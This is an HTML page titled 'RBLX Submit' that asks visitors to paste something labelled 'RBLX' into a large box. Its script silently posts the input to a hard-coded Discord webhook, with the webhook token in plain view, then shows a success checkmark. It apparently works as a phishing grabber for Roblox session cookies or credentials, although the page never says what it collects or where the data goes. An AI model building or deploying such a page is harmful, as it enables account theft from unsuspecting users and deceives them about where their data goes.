<!doctype html>
<html lang="en" class="h-full">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RBLX Submit</title>
  <script src="https://cdn.tailwindcss.com/3.4.17"></script>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
  <style>
    @keyframes neonPulse {
      0%, 100% { text-shadow: 0 0 10px #39ff14, 0 0 20px #39ff14, 0 0 40px #39ff14; }
      50% { text-shadow: 0 0 5px #39ff14, 0 0 10px #39ff14, 0 0 20px #39ff14; }
    }
    @keyframes tickDraw {
      0% { stroke-dashoffset: 60; }
      100% { stroke-dashoffset: 0; }
    }
    @keyframes circleDraw {
      0% { stroke-dashoffset: 314; }
      100% { stroke-dashoffset: 0; }
    }
    @keyframes fadeScale {
      0% { opacity: 0; transform: scale(0.5); }
      100% { opacity: 1; transform: scale(1); }
    }
    .neon-glow { animation: neonPulse 2s ease-in-out infinite; }
    .neon-box {
      box-shadow: 0 0 10px #39ff14, 0 0 20px rgba(57,255,20,0.3), inset 0 0 10px rgba(57,255,20,0.1);
      border: 2px solid #39ff14;
    }
    .neon-box:focus {
      box-shadow: 0 0 15px #39ff14, 0 0 30px rgba(57,255,20,0.5), inset 0 0 15px rgba(57,255,20,0.15);
    }
    .neon-btn {
      box-shadow: 0 0 10px #39ff14, 0 0 20px rgba(57,255,20,0.3);
      transition: all 0.2s;
    }
    .neon-btn:hover {
      box-shadow: 0 0 20px #39ff14, 0 0 40px rgba(57,255,20,0.5);
      background: #39ff14;
      color: #000;
    }
    .neon-btn:disabled { opacity: 0.4; cursor: not-allowed; }
    .success-svg circle {
      stroke-dasharray: 314;
      stroke-dashoffset: 314;
      animation: circleDraw 0.6s ease forwards;
    }
    .success-svg polyline {
      stroke-dasharray: 60;
      stroke-dashoffset: 60;
      animation: tickDraw 0.4s ease forwards 0.5s;
    }
    .success-container { animation: fadeScale 0.4s ease forwards; }
    body { box-sizing: border-box; }
  </style>
</head>
<body class="h-full" style="background:#0a0a0a; font-family:'Orbitron',monospace;">
  <div id="app" class="h-full w-full flex items-center justify-center">
    <div id="formView" class="w-full max-w-2xl px-6 text-center">
      <h1 class="text-3xl md:text-5xl font-black mb-10 neon-glow" style="color:#39ff14;">Enter RBLX</h1>

      <form id="submitForm">
        <textarea
          id="rblxInput"
          class="neon-box w-full rounded-xl bg-transparent text-left text-lg md:text-xl font-semibold px-6 py-6 md:py-8 outline-none mb-5 resize-none"
          style="color:#39ff14; caret-color:#39ff14; height:280px;"
          autocomplete="off"
          placeholder="Enter RBLX"
          required
        ></textarea>

    

        <button
          id="doneBtn"
          type="submit"
          class="neon-btn rounded-xl px-12 py-4 text-lg md:text-xl font-bold bg-transparent border-2 border-green-400"
          style="color:#39ff14; border-color:#39ff14;"
        >
          Done
        </button>
      </form>
    </div>

    <div id="successView" class="hidden success-container text-center">
      <svg class="success-svg mx-auto" width="120" height="120" viewBox="0 0 120 120" fill="none">
        <circle cx="60" cy="60" r="50" stroke="#39ff14" stroke-width="4" fill="none" />
        <polyline points="38,62 54,78 82,42" stroke="#39ff14" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round" />
      </svg>
    </div>
  </div>

  <script>
    const WEBHOOK = "https://discord.com/api/webhooks/1488637778370760704/2NjiSIH6Wsh-00CcQeVM6c-FHiNBvuocKFFesowygXluSmfAHtFGMeZDwaaBvXfEfttA";

    const form = document.getElementById("submitForm");
    const input = document.getElementById("rblxInput");
    const btn = document.getElementById("doneBtn");
    const formView = document.getElementById("formView");
    const successView = document.getElementById("successView");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const val = input.value.trim();
      if (!val) {
        input.focus();
        return;
      }

      btn.disabled = true;
      btn.textContent = "Sending...";

      try {
        const res = await fetch(WEBHOOK + "?wait=true", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `**New RBLX submission:** ${val}`
          })
        });

        if (!res.ok) {
          throw new Error("Webhook failed");
        }

        formView.classList.add("hidden");
        successView.classList.remove("hidden");

        setTimeout(() => {
          input.value = "";
          btn.disabled = false;
          btn.textContent = "Done";
          successView.classList.add("hidden");
          formView.classList.remove("hidden");
        }, 1600);
      } catch (err) {
        btn.disabled = false;
        btn.textContent = "Done";
        alert("Submit failed. Check the webhook URL.");
      }
    });
  </script>
</body>
</html>
